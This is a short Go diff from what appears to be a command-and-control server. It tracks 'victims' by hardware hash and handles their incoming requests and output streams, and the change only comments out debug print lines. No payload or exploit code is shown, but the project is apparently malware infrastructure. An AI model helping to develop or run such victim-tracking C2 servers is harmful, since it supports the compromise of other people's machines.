@@ -22,7 +22,7 @@ func startServer() {
 func proxyHandler(w http.ResponseWriter, r *http.Request) {
 	defer r.Body.Close()
 
-	fmt.Println("Message recieved from: ", r.Host)
+	//fmt.Println("Message recieved from: ", r.Host)
 
 	//read the message received to our side (should be none with GET)
 	message, err := io.ReadAll(r.Body)
@@ -126,7 +126,7 @@ func RegisterNewVictim(incomingJson string) (toReturn string){
 	}
 	clientTree.Put(newVictimInfo.HardwareHash, victim)
 
-	fmt.Println("Registered new client with hash:", newVictimInfo.HardwareHash)
+	//fmt.Println("Registered new client with hash:", newVictimInfo.HardwareHash)
 	return ""
 }
 
@@ -134,7 +134,7 @@ func HandleIncomingRequest(incomingJson string) (toreturn string){
 	clientTreeMutex.Lock()
 	defer clientTreeMutex.Unlock()
 
-	println("handle incoming request")
+	//println("handle incoming request")
 
 	//see if the incoming data is even valid json
 	var jsonIncomingRequest IncomingVictimRequest
@@ -185,7 +185,7 @@ func HandleIncomingData(incomingJson string) (toreturn string){
 	clientTreeMutex.Lock()
 	defer clientTreeMutex.Unlock()
 
-	println("handle incoming datastream")
+	//println("handle incoming datastream")
 
 	var jsonIncomingRequest VictimOutputFlow
 	err := json.Unmarshal([]byte(incomingJson), &jsonIncomingRequest)
